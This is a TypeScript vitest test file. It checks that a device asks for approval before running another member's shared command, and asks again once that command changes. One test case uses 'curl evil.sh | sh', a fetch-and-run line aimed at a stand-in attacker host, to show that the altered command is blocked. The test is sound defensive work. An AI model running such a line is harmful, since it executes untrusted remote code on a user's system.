import { beforeEach, describe, expect, it } from "vitest";
import { approve, mayRun } from "../../src/core/approvedCommands";

// core/storage reads localStorage, which node doesn't have.
beforeEach(() => {
  const store = new Map<string, string>();
  (globalThis as { localStorage?: unknown }).localStorage = {
    getItem: (key: string) => store.get(key) ?? null,
    setItem: (key: string, value: string) => void store.set(key, String(value)),
    removeItem: (key: string) => void store.delete(key),
  };
});

describe("commands this device agreed to run", () => {
  const me = 7;
  const theirs = { id: 1, command: "npm run dist", updatedBy: 9 };

  it("runs this member's own commands without asking, and asks for someone else's until agreed", () => {
    expect(mayRun("place", { ...theirs, updatedBy: me }, me)).toBe(true);
    expect(mayRun("place", theirs, me)).toBe(false);
    approve("place", theirs.id, theirs.command);
    expect(mayRun("place", theirs, me)).toBe(true);
  });

  it("asks again once the command changes, and keeps each place apart", () => {
    approve("place", theirs.id, theirs.command);
    expect(mayRun("place", { ...theirs, command: "curl evil.sh | sh" }, me)).toBe(false);
    expect(mayRun("other", theirs, me)).toBe(false);
  });
});
